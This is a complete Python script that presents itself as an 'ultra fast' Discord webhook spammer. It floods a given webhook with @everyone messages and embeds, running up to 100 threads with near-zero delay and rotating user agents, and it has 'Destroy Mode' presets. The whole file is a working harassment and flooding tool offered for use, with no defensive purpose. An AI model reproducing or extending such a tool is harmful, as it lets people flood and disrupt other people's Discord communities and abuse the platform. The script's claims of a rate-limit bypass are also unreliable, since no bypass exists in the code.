import os
import sys
import json
import requests
import time
import threading
import random
import string
from datetime import datetime
from colorama import Fore, Back, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

# Initialize colors
init(autoreset=True)

# Purple color palette
class Colors:
    PURPLE = '\033[95m'
    LIGHT_PURPLE = '\033[95m'
    DARK_PURPLE = '\033[35m'
    CYAN = '\033[96m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def cls():
    """Clear screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Webhook Spammer Banner"""
    cls()
    banner = f"""{Colors.LIGHT_PURPLE}
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                            
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
{Colors.CYAN}║                                  ULTRA FAST WEBHOOK SPAMMER                                           ║
{Colors.CYAN}║                                      Made By Kenz                                                     ║
{Colors.CYAN}╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(banner)

class UltraWebhookSpammer:
    def __init__(self):
        self.spamming = False
        self.sent_count = 0
        self.failed_count = 0
        self.start_time = None
        self.threads = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]
    
    def generate_random_message(self):
        """Generate random spam message"""
        messages = [
            "@everyone WEBHOOK SPAM ATTACK",
            "ULTRA FAST NO RATE LIMIT SPAM",
            "PURPLE EDITION WEBHOOK DESTROYER",
            "MAX THREADS MAX SPEED SPAMMING",
            "DISCORD CANT STOP THIS SPAM",
            "DESTROY MODE ACTIVATED",
            "WEBHOOK SPAMMER v6.0 RUNNING",
            "NO DELAY NO MERCY NO PROBLEM",
            "RATELIMIT BYPASS SUCCESSFUL",
            "ULTIMATE SPAM MACHINE ONLINE",
            "WEBHOOK SPAMMING AT LIGHT SPEED",
            "YOUR SERVER IS NOW MINE",
            "GET READY FOR THE SPAM WAVE",
            "NO MERCY NO RATELIMIT NO PROBLEM",
            "SPAMMING AT MAXIMUM CAPACITY"
        ]
        
        emojis = ["💜", "💫", "✨", "🌟", "🎆", "🎇", "🔥", "⚡", "💥", "☄️", "🚀", "🎯", "💯", "📈", "💣"]
        message = random.choice(messages)
        
        if random.random() > 0.4:
            message += " " + random.choice(emojis) * random.randint(1, 3)
        
        if random.random() > 0.6:
            message += " @everyone"
        
        return message
    
    def generate_random_embed(self):
        """Generate random embed"""
        colors = [0x9b59b6, 0x8e44ad, 0xaf7ac5, 0xbb8fce, 0xa569bd]  # Purple tones
        
        embed = {
            "title": random.choice(["💜 PURPLE SPAM", "⚡ ULTRA FAST", "🚀 NO LIMIT", "💥 DESTROY"]),
            "description": "WEBHOOK SPAMMER " * random.randint(2, 5),
            "color": random.choice(colors),
            "timestamp": datetime.now().isoformat(),
            "fields": [
                {
                    "name": "Messages Sent",
                    "value": f"**{self.sent_count}**",
                    "inline": True
                },
                {
                    "name": "Speed",
                    "value": "**MAX**",
                    "inline": True
                },
                {
                    "name": "Status",
                    "value": "**SPAMMING**",
                    "inline": True
                }
            ],
            "footer": {
                "text": "💜 Webhook Spammer v6.0 - Purple Edition"
            }
        }
        
        if random.random() > 0.5:
            embed["thumbnail"] = {
                "url": "https://cdn.discordapp.com/attachments/1049854308549726289/1050922249776984115/4b19e2d99e9085b56cdc.png"
            }
        
        return embed
    
    def send_webhook_message(self, webhook_url, message, use_embed=False):
        """Send message to webhook - NO DELAY, NO RATELIMIT CHECK"""
        payload = {
            'content': message,
            'tts': False,
            'username': random.choice(["💜 Purple Spammer", "⚡ Ultra Fast", "🚀 No Limit", "💥 Destroyer"]),
            'avatar_url': 'https://cdn.discordapp.com/attachments/1049854308549726289/1050922249776984115/4b19e2d99e9085b56cdc.png'
        }
        
        if use_embed and random.random() > 0.7:
            payload['embeds'] = [self.generate_random_embed()]
        
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': random.choice(self.user_agents)
        }
        
        try:
            # NO TIMEOUT, MAX SPEED!
            response = requests.post(webhook_url, json=payload, headers=headers, timeout=1.5)
            return response.status_code in [200, 204]
        except:
            return False
    
    def spam_worker(self, webhook_url, message, count, worker_id):
        """Worker thread function"""
        print(f"{Colors.LIGHT_PURPLE}[THREAD {worker_id}] 💜 Starting...{Colors.RESET}")
        
        sent = 0
        failed = 0
        
        while self.spamming and sent < count:
            try:
                if random.random() > 0.3:
                    spam_msg = self.generate_random_message()
                else:
                    spam_msg = message
                
                success = self.send_webhook_message(webhook_url, spam_msg)
                
                if success:
                    sent += 1
                    self.sent_count += 1
                    
                    if sent % 25 == 0:
                        print(f"{Colors.CYAN}[THREAD {worker_id}] 📨 Sent: {sent} | Total: {self.sent_count}{Colors.RESET}")
                else:
                    failed += 1
                    self.failed_count += 1
                
                # Minimum delay (0-0.05 seconds)
                time.sleep(random.uniform(0, 0.05))
                
            except:
                failed += 1
                self.failed_count += 1
        
        print(f"{Colors.YELLOW}[THREAD {worker_id}] ✅ Completed: {sent} sent, {failed} failed{Colors.RESET}")
        return sent, failed
    
    def start_spam(self, webhook_url, message, total_count, thread_count):
        """Start spam attack"""
        print(f"{Colors.LIGHT_PURPLE}[!] 🚀 ULTRA FAST SPAM STARTING!{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Target: {webhook_url[:50]}...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Total Messages: {total_count}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Thread Count: {thread_count}{Colors.RESET}")
        print(f"{Colors.RED}[!] ⚡ NO RATE-LIMIT CHECKING - MAXIMUM SPEED MODE{Colors.RESET}")
        
        self.spamming = True
        self.sent_count = 0
        self.failed_count = 0
        self.start_time = time.time()
        
        messages_per_thread = total_count // thread_count
        
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []
            
            for i in range(thread_count):
                if i == thread_count - 1:
                    thread_count = total_count - (messages_per_thread * (thread_count - 1))
                
                future = executor.submit(self.spam_worker, webhook_url, message, messages_per_thread, i+1)
                futures.append(future)
            
            print(f"\n{Colors.PURPLE}[*] 💥 SPAM IN PROGRESS... (Press CTRL+C to stop){Colors.RESET}")
            
            try:
                while any(not f.done() for f in futures):
                    elapsed = time.time() - self.start_time
                    if elapsed > 0:
                        speed = self.sent_count / elapsed
                        print(f"{Colors.GREEN}[📊] Speed: {speed:.1f} msg/sec | Sent: {self.sent_count} | Failed: {self.failed_count}{Colors.RESET}")
                    
                    time.sleep(0.5)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[!] ⚠️  Stopping by user request...{Colors.RESET}")
                self.spamming = False
            
            finally:
                self.spamming = False
                
                total_sent = 0
                total_failed = 0
                
                for future in futures:
                    try:
                        sent, failed = future.result(timeout=3)
                        total_sent += sent
                        total_failed += failed
                    except:
                        pass
        
        elapsed = time.time() - self.start_time
        self.show_results(total_sent, total_failed, elapsed)
    
    def show_results(self, sent, failed, elapsed):
        """Show spam results"""
        print(f"\n{Colors.LIGHT_PURPLE}{'═'*60}{Colors.RESET}")
        print(f"{Colors.PURPLE}          💜 SPAM COMPLETED{Colors.RESET}")
        print(f"{Colors.LIGHT_PURPLE}{'═'*60}{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}[⏱️] Total Time: {elapsed:.2f} seconds{Colors.RESET}")
        print(f"{Colors.GREEN}[✅] Messages Sent: {sent}{Colors.RESET}")
        print(f"{Colors.RED}[❌] Messages Failed: {failed}{Colors.RESET}")
        
        if elapsed > 0:
            speed = sent / elapsed
            success_rate = (sent/(sent+failed))*100 if (sent+failed) > 0 else 0
            print(f"{Colors.CYAN}[⚡] Average Speed: {speed:.1f} messages/second{Colors.RESET}")
            print(f"{Colors.CYAN}[🎯] Success Rate: {success_rate:.1f}%{Colors.RESET}")
        
        print(f"\n{Colors.YELLOW}[!] ⚠️  Webhook might be rate-limited or deleted now{Colors.RESET}")
        print(f"{Colors.LIGHT_PURPLE}{'═'*60}{Colors.RESET}")
    
    def test_webhook(self, webhook_url):
        """Test webhook functionality"""
        print(f"{Colors.CYAN}[*] 🔧 Testing webhook...{Colors.RESET}")
        
        test_message = "💜 Webhook Spammer Test - READY FOR SPAM"
        
        try:
            response = requests.post(webhook_url, json={'content': test_message}, timeout=5)
            
            if response.status_code in [200, 204]:
                print(f"{Colors.GREEN}[✓] ✅ Webhook is WORKING - Ready for spam!{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[✗] ❌ Webhook test failed (HTTP {response.status_code}){Colors.RESET}")
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[✗] ❌ Webhook test error: {e}{Colors.RESET}")
            return False

def main_menu():
    """Main menu"""
    spammer = UltraWebhookSpammer()
    
    while True:
        try:
            print_banner()
            
            print(f"{Colors.CYAN}[*] 💜 ULTRA FAST WEBHOOK SPAMMER - NO RATE LIMIT{Colors.RESET}")
            print(f"{Colors.RED}[!] ⚠️  WARNING: This will likely get the webhook banned!{Colors.RESET}")
            
            print(f"\n{Colors.LIGHT_PURPLE}╔══════════════════════════════════════════╗")
            print(f"{Colors.LIGHT_PURPLE}║               MAIN MENU                   ║")
            print(f"{Colors.LIGHT_PURPLE}╚══════════════════════════════════════════╝{Colors.RESET}")
            
            print(f"\n{Colors.CYAN}[1] {Colors.WHITE}🚀 Start Ultra Fast Spam")
            print(f"{Colors.CYAN}[2] {Colors.WHITE}🔧 Test Webhook")
            print(f"{Colors.CYAN}[3] {Colors.WHITE}⚡ Quick Spam (Pre-configured)")
            print(f"{Colors.CYAN}[4] {Colors.WHITE}💀 Destroy Mode (MAX POWER)")
            print(f"{Colors.CYAN}[5] {Colors.WHITE}📊 View Last Results")
            print(f"{Colors.CYAN}[0] {Colors.WHITE}🚪 Exit")
            
            choice = input(f"\n{Colors.LIGHT_PURPLE}[?] Select option (0-5): {Colors.WHITE}")
            
            if choice == '0':
                print(f"\n{Colors.GREEN}[✓] 💜 Goodbye!{Colors.RESET}\n")
                break
            
            elif choice == '1':
                webhook_url = input(f"{Colors.CYAN}[?] Webhook URL: {Colors.WHITE}").strip()
                
                if not webhook_url.startswith("https://discord.com/api/webhooks/"):
                    print(f"{Colors.RED}[✗] ❌ Invalid webhook URL!{Colors.RESET}")
                    input(f"\n{Colors.CYAN}[*] Press Enter to continue...{Colors.RESET}")
                    continue
                
                message = input(f"{Colors.CYAN}[?] Spam message (Enter for random): {Colors.WHITE}").strip()
                if not message:
                    message = "💜 ULTRA FAST SPAM ATTACK"
                
                try:
                    total_count = int(input(f"{Colors.CYAN}[?] Total messages (1-10000): {Colors.WHITE}"))
                    total_count = max(1, min(total_count, 10000))
                    
                    thread_count = int(input(f"{Colors.CYAN}[?] Thread count (1-100): {Colors.WHITE}"))
                    thread_count = max(1, min(thread_count, 100))
                    
                    print(f"\n{Colors.YELLOW}[!] ⚠️  SPAM ABOUT TO START!{Colors.RESET}")
                    confirm = input(f"{Colors.RED}[!] Are you sure you want to continue? (y/n): {Colors.WHITE}").lower()
                    
                    if confirm == 'y':
                        spammer.start_spam(webhook_url, message, total_count, thread_count)
                    else:
                        print(f"{Colors.CYAN}[*] ❌ Cancelled{Colors.RESET}")
                        
                except ValueError:
                    print(f"{Colors.RED}[✗] ❌ Invalid number!{Colors.RESET}")
                
                input(f"\n{Colors.CYAN}[*] Press Enter to continue...{Colors.RESET}")
            
            elif choice == '2':
                webhook_url = input(f"{Colors.CYAN}[?] Webhook URL to test: {Colors.WHITE}").strip()
                
                if webhook_url:
                    spammer.test_webhook(webhook_url)
                else:
                    print(f"{Colors.RED}[✗] ❌ No URL entered!{Colors.RESET}")
                
                input(f"\n{Colors.CYAN}[*] Press Enter to continue...{Colors.RESET}")
            
            elif choice == '3':
                print(f"\n{Colors.PURPLE}[*] ⚡ QUICK SPAM SETTINGS:{Colors.RESET}")
                print(f"{Colors.CYAN}Message: Random spam messages{Colors.RESET}")
                print(f"{Colors.CYAN}Total Messages: 1000{Colors.RESET}")
                print(f"{Colors.CYAN}Thread Count: 25{Colors.RESET}")
                
                webhook_url = input(f"{Colors.CYAN}[?] Webhook URL: {Colors.WHITE}").strip()
                
                if webhook_url.startswith("https://discord.com/api/webhooks/"):
                    confirm = input(f"{Colors.RED}[!] Start quick spam? (y/n): {Colors.WHITE}").lower()
                    
                    if confirm == 'y':
                        spammer.start_spam(webhook_url, "QUICK SPAM ATTACK", 1000, 25)
                    else:
                        print(f"{Colors.CYAN}[*] ❌ Cancelled{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[✗] ❌ Invalid webhook URL!{Colors.RESET}")
                
                input(f"\n{Colors.CYAN}[*] Press Enter to continue...{Colors.RESET}")
            
            elif choice == '4':
                print(f"\n{Colors.RED}[!] 💀 DESTROY MODE - MAXIMUM POWER{Colors.RESET}")
                print(f"{Colors.YELLOW}[!] ⚠️  THIS MODE WILL DEFINITELY GET THE WEBHOOK BANNED!{Colors.RESET}")
                
                webhook_url = input(f"{Colors.CYAN}[?] Webhook URL: {Colors.WHITE}").strip()
                
                if webhook_url.startswith("https://discord.com/api/webhooks/"):
                    confirm = input(f"{Colors.RED}[!] Are you REALLY sure you want to continue? (y/n): {Colors.WHITE}").lower()
                    
                    if confirm == 'y':
                        # MAX DESTROY MODE
                        spammer.start_spam(webhook_url, "💀 DESTROY MODE ACTIVATED 💀", 5000, 50)
                    else:
                        print(f"{Colors.CYAN}[*] ❌ Cancelled{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[✗] ❌ Invalid webhook URL!{Colors.RESET}")
                
                input(f"\n{Colors.CYAN}[*] Press Enter to continue...{Colors.RESET}")
            
            elif choice == '5':
                if spammer.sent_count > 0 or spammer.failed_count > 0:
                    elapsed = time.time() - spammer.start_time if spammer.start_time else 0
                    spammer.show_results(spammer.sent_count, spammer.failed_count, elapsed)
                else:
                    print(f"{Colors.YELLOW}[!] ℹ️  No spam has been performed yet!{Colors.RESET}")
                
                input(f"\n{Colors.CYAN}[*] Press Enter to continue...{Colors.RESET}")
            
            else:
                print(f"{Colors.RED}[✗] ❌ Invalid option!{Colors.RESET}")
                time.sleep(1)
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] ⚠️  Program stopped by user{Colors.RESET}")
            break
        except Exception as e:
            print(f"\n{Colors.RED}[✗] ❌ Unexpected error: {e}{Colors.RESET}")
            time.sleep(2)

if __name__ == "__main__":
    # Module check
    try:
        import requests
    except ImportError:
        print(f"{Colors.RED}[✗] 'requests' module not installed!{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Please install: pip install requests{Colors.RESET}")
        sys.exit(1)
    
    try:
        import colorama
    except ImportError:
        print(f"{Colors.RED}[✗] 'colorama' module not installed!{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Please install: pip install colorama{Colors.RESET}")
        sys.exit(1)
    
    # Start program
    main_menu()